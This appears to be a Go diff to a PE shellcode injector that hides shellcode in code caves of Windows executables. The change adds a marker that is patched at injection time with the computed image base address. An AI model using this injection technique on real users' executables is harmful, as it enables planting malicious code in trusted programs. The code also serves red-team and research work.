@@ -39,9 +39,14 @@ const (
 	ModeCreateSection = "create-section"
 )
 
-// endOfShellcode is used to mark the end of shellcode.
-// NOP DWORD ptr [EAX + EAX*1 + 00]
-var endOfShellcode = []byte{0x0F, 0x1F, 0x44, 0x00, 0x00}
+var (
+	// imageBaseStub is used to mark the offset of the image base.
+	imageBaseStub = []byte{0x20, 0x25, 0x08, 0x21}
+
+	// endOfShellcode is used to mark the end of shellcode.
+	// NOP DWORD ptr [EAX + EAX*1 + 00]
+	endOfShellcode = []byte{0x0F, 0x1F, 0x44, 0x00, 0x00}
+)
 
 // Injector is a simple PE injector for inject shellcode.
 type Injector struct {
@@ -602,6 +607,13 @@ func (inj *Injector) insert(targetRVA uint32, first *codeCave) error {
 		if size+nearJumpSize > uint32(c.size) {
 			return errors.New("appear too large instruction in shellcode")
 		}
+		// check it is contained the image base stub
+		if bytes.Contains(segment, imageBaseStub) {
+			addr := ccLi[i-2].virtualAddr + 5
+			buf := make([]byte, 4)
+			binary.LittleEndian.PutUint32(buf, addr)
+			segment = bytes.ReplaceAll(segment, imageBaseStub, buf)
+		}
 		// check it is the end of the shellcode
 		if bytes.Equal(segment, endOfShellcode) {
 			rel := int64(current.virtualAddr) - int64(c.virtualAddr) - nearJumpSize
@@ -772,6 +784,14 @@ func (inj *Injector) padding(shellcode []byte, targetRVA uint32) {
 	var scLen uint32
 	for i := 0; i < len(inj.segment); i++ {
 		segment := inj.segment[i]
+		// check it is contained the image base stub
+		if bytes.Contains(segment, imageBaseStub) {
+			addr := inj.section.VirtualAddress + uint32(len(saveContext)) + scLen
+			addr -= uint32(len(inj.segment[i-1]))
+			buf := make([]byte, 4)
+			binary.LittleEndian.PutUint32(buf, addr)
+			segment = bytes.ReplaceAll(segment, imageBaseStub, buf)
+		}
 		// check it is the end of the shellcode
 		if !bytes.Equal(segment, endOfShellcode) {
 			insts.Write(segment)
